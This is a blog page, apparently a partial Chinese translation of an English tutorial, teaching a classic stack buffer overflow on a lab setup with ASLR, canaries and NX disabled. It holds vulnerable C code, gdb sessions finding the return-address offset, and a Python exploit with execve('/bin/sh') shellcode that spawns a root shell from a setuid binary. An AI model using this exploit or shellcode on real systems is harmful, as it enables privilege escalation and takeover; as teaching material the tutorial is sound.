@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+
+  <meta name="description" content="Classic Stack Based Buffer Overflow"/>
+
+
+
+
+  <meta name="keywords" content="stack overflow, pwn, exploit series, Znight" />
+
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Znight">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.5.0" />
+
+
+
+<link rel="canonical" href="http://znight.sight/2019/01/05/Classic-Stack-Based-Buffer-Overflow/"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.5.0" />
+
+
+
+  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+
+
+
+
+  
+
+
+
+  <script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+
+    <title> Classic Stack Based Buffer Overflow - Znight </title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Znight</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+      <a href="/">
+        <li class="mobile-menu-item">
+          
+          
+            Home
+          
+        </li>
+      </a>
+    
+      <a href="/archives/">
+        <li class="mobile-menu-item">
+          
+          
+            Archives
+          
+        </li>
+      </a>
+    
+      <a href="/tags/">
+        <li class="mobile-menu-item">
+          
+          
+            Tags
+          
+        </li>
+      </a>
+    
+      <a href="/categories">
+        <li class="mobile-menu-item">
+          
+          
+            Categories
+          
+        </li>
+      </a>
+    
+  </ul>
+</nav>
+
+    <div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Znight</a>
+</div>
+
+<nav class="site-navbar">
+  
+    <ul id="menu" class="menu">
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/">
+            
+            
+              Home
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            
+            
+              Archives
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            
+            
+              Tags
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            
+            
+              Categories
+            
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Classic Stack Based Buffer Overflow
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-01-05
+        </span>
+        
+          <div class="post-category">
+            
+              <a href="/categories/Translate/">Translate</a>
+            
+          </div>
+        
+      </div>
+    </header>
+
+    
+    
+
+    <div class="post-content">
+      
+        <p>Posted on <a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="external">May 8, 2015</a> by <a href="https://sploitfun.wordpress.com/author/sploitfun/" target="_blank" rel="external">sploitfun</a></p>
+<blockquote>
+<p>前文部分是翻译, 后文译者扩展了部分内容</p>
+</blockquote>
+<p><em>VM Setup</em>: Ubuntu 12.04 (x86)</p>
+<p>这是该系列中最简单的一篇文章，并且，你已经能够在网上找到许多内容相似的文章。尽管如此，我仍然想要在自己博客上也写一篇关于它的文章，因为这将会为我之后要发表的post打下基础。</p>
+<a id="more"></a>
+<blockquote>
+<p>什么是Buffer Overflow?</p>
+</blockquote>
+<p>在以下情况中,将<code>source buffer</code>复制到<code>destination buffer</code>中可能会产生溢出:</p>
+<ol>
+<li>源字符串比目标字符串更长</li>
+<li>没有长度检测</li>
+</ol>
+<p>栈溢出可分为如下两种类型:</p>
+<ol>
+<li>Stack Based Buffer Overflow  – 目的缓冲区在栈中</li>
+<li>Heap Based Buffer Overflow – 目的缓冲区在堆中</li>
+</ol>
+<p>Here in this post, I will talk only about stack based buffer overflow. Heap overflows will be discussed in ‘Level 3’ of <a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/" target="_blank" rel="external">Linux (x86) Exploit Development Tutorial Series</a>!!</p>
+<p>栈溢出漏洞将会导致任意代码执行!!</p>
+<blockquote>
+<p>什么是<code>arbitrary code execution</code>?</p>
+</blockquote>
+<p>任意代码执行允许攻击者执行他想要执行的代码, 以此来获得受害机器的控制权. 攻击者可通过产生一个<code>root shell</code>, 添加一个新用户, 开启一个网络端口等方式来获得主机的控制权.</p>
+<p>听起来还蛮有意思的, 让我们通过下面的一段代码来更深入的了解栈溢出!</p>
+<p><em>Vulnerable Code:</em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><em>Compilation Commands:</em></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span>echo 0 &gt; /proc/sys/kernel/randomize_va_space	//关闭aslr</div><div class="line"><span class="meta">$</span>gcc -g -fno-stack-protector -z execstack -o vuln vuln.c 	//无cannary</div><div class="line"><span class="meta">$</span>sudo chown root vuln	//改变权限</div><div class="line"><span class="meta">$</span>sudo chgrp root vuln</div><div class="line"><span class="meta">$</span>sudo chmod +s vuln		//设置suid</div></pre></td></tr></table></figure>
+<p>在上述代码中,Line [2]存在缓冲区溢出漏洞. 这个漏洞可以造成任意代码执行, 因为源缓冲区的内容是由用户输入的.</p>
+<blockquote>
+<p>任意代码执行如何实现?</p>
+</blockquote>
+<p><code>Arbitrary code execution</code>是通过<code>Return Address Overwrite</code>实现的. 通过对返回地址的覆写, 我们可以返回到任意地方.</p>
+<p>在看exp之前, 我们先看看反汇编代码和栈布局.</p>
+<p><em>Disassembly</em>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code for function main:</div><div class="line">   //Function Prologue</div><div class="line">   0x08048414 &lt;+0&gt;:	push   %ebp                      //backup caller&apos;s ebp</div><div class="line">   0x08048415 &lt;+1&gt;:	mov    %esp,%ebp                 //set callee&apos;s ebp to esp</div><div class="line"></div><div class="line">   0x08048417 &lt;+3&gt;:	and    $0xfffffff0,%esp          //stack alignment</div><div class="line">   0x0804841a &lt;+6&gt;:	sub    $0x110,%esp               //stack space for local variables</div><div class="line">   0x08048420 &lt;+12&gt;:	mov    0xc(%ebp),%eax            //eax = argv</div><div class="line">   0x08048423 &lt;+15&gt;:	add    $0x4,%eax                 //eax = &amp;argv[1]</div><div class="line">   0x08048426 &lt;+18&gt;:	mov    (%eax),%eax               //eax = argv[1]</div><div class="line">   0x08048428 &lt;+20&gt;:	mov    %eax,0x4(%esp)            //strcpy arg2 </div><div class="line">   0x0804842c &lt;+24&gt;:	lea    0x10(%esp),%eax           //eax = &apos;buf&apos; </div><div class="line">   0x08048430 &lt;+28&gt;:	mov    %eax,(%esp)               //strcpy arg1</div><div class="line">   0x08048433 &lt;+31&gt;:	call   0x8048330 &lt;strcpy@plt&gt;    //call strcpy</div><div class="line">   0x08048438 &lt;+36&gt;:	mov    $0x8048530,%eax           //eax = format str &quot;Input:%s\n&quot;</div><div class="line">   0x0804843d &lt;+41&gt;:	lea    0x10(%esp),%edx           //edx = buf</div><div class="line">   0x08048441 &lt;+45&gt;:	mov    %edx,0x4(%esp)            //printf arg2</div><div class="line">   0x08048445 &lt;+49&gt;:	mov    %eax,(%esp)               //printf arg1</div><div class="line">   0x08048448 &lt;+52&gt;:	call   0x8048320 &lt;printf@plt&gt;    //call printf</div><div class="line">   0x0804844d &lt;+57&gt;:	mov    $0x0,%eax                 //return value 0</div><div class="line"></div><div class="line">   //Function Epilogue</div><div class="line">   0x08048452 &lt;+62&gt;:	leave                            //mov ebp, esp; pop ebp; </div><div class="line">   0x08048453 &lt;+63&gt;:	ret                              //return</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p><em>Stack Layout</em>:</p>
+<p><img src="./stack.png" alt="img"></p>
+<p>我们已经知道超过256字节的输入将会导致溢出, 并且可能会覆盖栈中存储的返回地址. 下面让我们测试一下.</p>
+<p>Test Step 1: Is Return Address Overwrite possible?</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.</div><div class="line">(gdb) r `python -c 'print "A"*300'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*300'`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x41414141 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line"><span class="meta">$</span>1 = 0x41414141</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>上面的输出表明EIP已经被覆盖为<code>AAAA</code>, 这证实了我们的想法—— 返回地址是可以覆写的.</p>
+<p>Test Step 2: What is the offset from Destination Buffer?</p>
+<p>下面我们需要计算出从返回地址到<code>buf</code>之间需要覆盖多少个字节, 从上面的栈布局图中我们可以看到<code>retaddr</code>到<code>buf</code>的偏移地址是<code>0x10c</code>, 计算过程如下:</p>
+<blockquote>
+<p>0x10c = 0x100 + 0x8 + 0x4</p>
+</blockquote>
+<p>上面</p>
+<ul>
+<li>0x100是buf缓冲区的大小</li>
+<li>0x8是对齐偏移</li>
+<li>0x4是caller’s EBP</li>
+</ul>
+<p>因此输入<code>A * 268 + B * 4</code>将会把返回地址改写成<code>BBBB</code>, 其余部分覆盖为<code>AAAA</code>.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.</div><div class="line">(gdb) r `python -c 'print "A"*268 + "B"*4'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*268 + "B"*4'`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x42424242 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line"><span class="meta">$</span>1 = 0x42424242</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>上述输出结果表明攻击将返回地址改写成了<code>BBBB</code>. 我们可以根据上述的原理写一个exp来实现任意代码执行.</p>
+<p><em>Exploit Code:</em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#exp.py </span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line"><span class="comment">#Stack address where shellcode is copied.</span></div><div class="line"><span class="comment">#这里这个地址好像有点问题, 地址应该返回到NOP或者shellcode处, 下面这个地址是在buf之中</span></div><div class="line">ret_addr = <span class="number">0xbffff1d0</span>       </div><div class="line">              </div><div class="line"><span class="comment">#Spawn a shell</span></div><div class="line"><span class="comment">#execve(/bin/sh)</span></div><div class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></div><div class="line"></div><div class="line"><span class="comment">#endianess convertion</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></div><div class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)</div><div class="line"></div><div class="line"><span class="comment"># buf = Junk + RA + NOP's + Shellcode</span></div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += <span class="string">"\x90"</span> * <span class="number">100</span></div><div class="line">buf += scode</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure>
+<p>执行上述的exp, 我们可以得到一个shell:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> python exp.py </div><div class="line">Calling vulnerable program</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S���</div><div class="line"></div><div class="line"><span class="meta">#</span> id</div><div class="line">uid=1000(sploitfun) gid=1000(sploitfun) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(sploitfun)</div><div class="line"><span class="meta">#</span> exit</div><div class="line"><span class="meta">$</span></div></pre></td></tr></table></figure>
+<p><em>NOTE</em>: Inorder to get this root shell, we turned off many exploit mitigation techniques. Infact for all the posts in level 1, I have disabled these exploit mitigation techniques, since the objective of level 1, is to introduce you to vulnerabilities. And  real fun happens when we get to “Level 2” of <a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/" target="_blank" rel="external">Linux (x86) Exploit Development Tutorial Series</a>, where I will talk about bypassing these exploit mitigation techniques!!!</p>
+
+      
+    </div>
+
+    
+      
+      
+
+
+
+      
+      
+    
+
+    
+      <footer class="post-footer">
+        
+          <div class="post-tags">
+            
+              <a href="/tags/soverflow/">stack overflow</a>
+            
+              <a href="/tags/pwn/">pwn</a>
+            
+              <a href="/tags/exploit-series/">exploit series</a>
+            
+          </div>
+        
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2017/12/08/windows-PE-COFF/">
+        <span class="next-text nav-default">Windows PE/COFF</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+      </footer>
+    
+
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>  
+      </main>
+
+      <footer id="footer" class="footer">
+
+  <div class="social-links">
+    
+      
+        
+          <a href="mailto:leeeric053@gmail.com" class="iconfont icon-email" title="email"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="http://github.com/Leeericent" class="iconfont icon-github" title="github"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+    
+      
+      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    
+  </div>
+
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+     
+      2017 - 
+    
+    2019
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Lericent Lee</span>
+  </span>
+</div>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+
+
+
+    
+  
+
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  
+
+
+    <script type="text/javascript" src="/js/src/even.js?v=2.5.0"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=2.5.0"></script>
+
+  </body>
+</html>
